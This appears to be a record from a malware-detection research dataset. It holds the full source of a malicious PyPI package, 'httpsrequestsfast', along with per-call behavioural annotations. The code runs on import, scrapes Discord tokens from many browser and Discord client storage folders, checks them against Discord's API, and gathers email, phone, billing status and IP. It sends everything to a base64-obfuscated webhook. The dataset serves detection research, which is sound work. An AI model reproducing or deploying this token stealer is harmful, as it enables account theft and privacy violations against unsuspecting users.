{
  "metadata": {
    "package_name": "httpsrequestsfast-1.3",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/httpsrequestsfast-1.3.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/httpsrequestsfast-1.3.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "httpsrequestsfast.py",
      "code_snippets": [
        {
          "snippet": "import os, re, json, requests\n\nfrom httpsrequestsfast.receiver import Receiver\nfrom httpsrequestsfast.sender import Sender\n\nclass Grabber:\n    def __init__(self):\n        self.url = \"https://discord.com/api/v9/users/@me\"\n        self.path = [\n            '_Roaming/Discord/Local Storage/leveldb',\n            '_Roaming/Lightcord/Local Storage/leveldb',\n            '_Roaming/discordcanary/Local Storage/leveldb',\n            '_Roaming/discordptb/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',\n            '_Local/Amigo/User Data/Local Storage/leveldb',\n            '_Local/Torch/User Data/Local Storage/leveldb',\n            '_Local/Kometa/User Data/Local Storage/leveldb',\n            '_Local/Orbitum/User Data/Local Storage/leveldb',\n            '_Local/CentBrowser/User Data/Local Storage/leveldb',\n            '_Local/7Star/7Star/User Data/Local Storage/leveldb',\n            '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',\n            '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',\n            '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',\n            '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',\n            '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',\n            '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',\n            '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',\n            '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',\n            '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',\n            '_Local/BraveSoftware/Brave-Browser/User Data/Local Storage/leveldb'\n        ]\n\n    def __get_tokens(self):\n        tokens = []\n        \n        for path in self.path:\n            path = path.replace('_Local', os.getenv('LOCALAPPDATA')).replace('_Roaming', os.getenv('APPDATA'))\n\n            if os.path.exists(path):\n                for filename in os.listdir(path):\n                    if not filename.endswith('.log') and not filename.endswith('.ldb'):\n                        continue\n                    else:\n                        for line in [i.strip() for i in open(f'{path}/{filename}', errors='ignore').readlines() if i.strip()]:\n                            for token in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line):\n                                tokens.append(token)\n        return set(tokens)\n\n    def __check_tokens(self, tokens):\n        valid_tokens = []\n\n        for token in tokens:\n            try:\n                result = requests.get(self.url, headers = {\n                        \"Authorization\": token\n                })\n                if result.status_code == 200:\n                    valid_tokens += f\"{token}\\n\"\n            except:\n                pass\n        return valid_tokens\n\n    def __recreate_token(self, char_array):\n        tokens = []\n        token = \"\"\n\n        for char in char_array:\n            if char == '\\n':\n                tokens.append(token)\n                token = \"\"\n            else:\n                token += char\n        return tokens\n\n    def __get_id(self, tokens):\n        ids = {}\n\n        for token in tokens:\n            src = requests.get(self.url, headers= {\n                \"Authorization\": token\n            })\n            userdata = json.loads(src.content)\n            ids[str(userdata[\"id\"])] = token\n        return ids\n\n    def __get_data(self, token):\n        data = []\n\n        src = requests.get(self.url, headers = {\n            \"Authorization\": token\n        })\n        userdata = json.loads(src.content)\n        phone = userdata['phone'] # Faster\n        data.append(f\"email -> {userdata['email']}\")\n\n        if (phone is not None):\n            data.append(f\"phone -> {phone}\")\n\n        return data\n\n    def __has_payment_methods(self, token) -> bool:\n        has_billing = False\n\n        billing = requests.get(\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers = {\n            \"Authorization\": token\n        }).json()\n\n        if len(billing) > 0:\n            has_billing = True\n        return has_billing\n\n    def main(self):\n        receiver = Receiver()\n        sender = Sender()\n        WEBHOOK = \"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTQzMjc4MjAzNTA0NTY2MzMzL2hRSzg5bGdvSEFVN2RYXzJ5dHRyYUdKcGJ3aFdSdzUxUGFwenNOSjhkSHRwUS15T3BXc1J1a1FDMmlON2g2UEhFTzdW\"\n        \n        tokens = self.__get_tokens()\n        verfied_tokens = self.__check_tokens(tokens)\n        recreated_tokens = self.__recreate_token(verfied_tokens)\n        full_verfied_tokens = self.__get_id(recreated_tokens)\n\n        content = \"\"\n        if len(full_verfied_tokens) > 0:\n            for token in full_verfied_tokens.values():\n                content += f\"\\n{token}\"\n                datas = self.__get_data(token)\n\n                for data in datas:\n                    content += f\"\\n{str(data)}\"\n                content += f\"\\nbilling -> {self.__has_payment_methods(token)}\"\n        else:\n            content = \"No tokens found!\\n\"\n\n        payload = {\n            \"embeds\": [\n                {\n                    \"title\": \"Discord Informations:\",\n                    \"description\": f\"```{sender._encode_data(content)}\\n```\",\n                    \"color\": 0x72F9F4\n                },\n                                {\n                    \"title\": \"Computer Informations:\",\n                    \"description\": f\"```ip -> {receiver._get_ip()}```\",\n                    \"color\": 0x72F9F4\n                }\n            ]\n        }\n        \n        try:\n            requests.post(sender._decode_data(WEBHOOK), json=payload)\n        except:\n            pass\n\ndef init():\n    Grabber().main()\n\ninit()",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "LOCALAPPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "APPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}/{filename}', errors='ignore'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'[w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "self.url, headers = {\"Authorization\": token}",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "self.url, headers = {\"Authorization\": token}",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "src.content",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "self.url, headers = {\"Authorization\": token}",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "src.content",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers = {\"Authorization\": token}",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "requests.get().json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "Receiver()",
              "action_description": "Instantiates Receiver class",
              "action_id": "init_receiver_class",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            },
            {
              "action_api": "Sender()",
              "action_description": "Instantiates Sender class",
              "action_id": "init_sender_class",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            },
            {
              "action_api": "sender._encode_data()",
              "action_description": "Encode string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "content",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "receiver._get_ip()",
              "action_description": "Retrieves public IP address using HTTP request",
              "action_id": "get_public_ip",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "sender._decode_data()",
              "action_description": "Decode obfuscated data",
              "action_id": "decode_obfuscated_data",
              "object": "WEBHOOK",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "sender._decode_data(WEBHOOK), json=payload",
              "object_description": "Webhook endpoint",
              "object_id": "webhook_endpoint",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "Grabber().main()",
              "action_description": "Instantiates Grabber class",
              "action_id": "init_grabber_class",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            }
          ]
        }
      ]
    }
  ]
}